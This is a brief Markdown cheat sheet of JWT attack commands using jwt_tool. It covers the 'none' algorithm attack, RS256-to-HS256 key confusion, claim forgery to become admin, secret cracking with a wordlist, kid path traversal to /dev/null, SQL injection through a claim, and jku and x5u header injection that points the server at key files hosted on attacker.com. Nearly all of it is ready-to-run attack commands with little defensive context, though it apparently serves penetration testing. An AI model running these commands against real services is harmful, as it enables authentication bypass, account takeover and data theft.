## jwtool example attacks

### none algorhythm
`python3 jwt_tool.py <JWT> -X a`

### Change algorithm from RS256 to HS256
`python3 jwt_tool.py <JWT> -S hs256 -k public.pem`

### Signature not being checked
`python3 jwt_tool.py <JWT> -I -pc name -pv admin`

### crack secret key
```
python3 jwt_tool.py <JWT> -C -d secrets.txt 
// Use -p flag for a string
```
### Use arbitrary files to verify
Key ID (kid) is an optional header having a string type which is used to indicate the specific key present in the filesystem or a database and then use its content for verifying the Signature. It can be dangerous if it is injectable because then an attacker can point to a specific file which content is predictable (i.e. /dev/null is perfect as it returns nothing).

```
python3 jwt_tool.py <JWT> -I -hc kid -hv "../../dev/null" -S hs256 -p ""
or
python3 jwt_tool.py -I -hc kid -hv "path/of/the/file" -S hs256 -p "Content of the file"
```
---
## ADVANCED ATTACKS

### sqli
```
python3 jwt_tool.py <JWT> -I -pc name -pv "imparable' ORDER BY 1--" -S hs256 -k public.pem
// Increment the value by 1 until an error will occur
```

### json set url (jku)
This parameter points to a set of public keys in JSON-encoded format (attributes n and e in JWKS) and “jwt_tool” auto generate the JWKS file named “jwttool_custom_jwks.json” for this attack at the first run of tool after installation.
`python3 jwt_tool.py <JWT> -X s -ju "https://attacker.com/jwttool_custom_jwks.json"`

### X.509 URL (x5u):
This parameter points to X.509 public key certificate or chain of certificates (attribute x5c in JWKS) and you can generate this certificate with the corresponding private key like this:
```
openssl req -newkey rsa:2048 -nodes -keyout private.pem -x509 -days 365 -out attacker.crt -subj "/C=AU/L=Brisbane/O=CompanyName/CN=pentester"
```
Here using OpenSSL, certificate got created in “attacker.crt” which now can be embedded in a JWKS file with “x5c” attribute and the exploitation can be done like this:
```
python3 jwt_tool.py <JWT> -S rs256 -pr private.pem -I -hc x5u -hv "https://attacker.com/custom_x5u.json"
```

### Embedded Public Keys:

If server embed public keys directly in the token via “jwk” (JSON Web Key) or “x5c” (X.509 Certificate Chain) parameters then try to replace them with your own public keys and sign the token with the corresponding Private key.
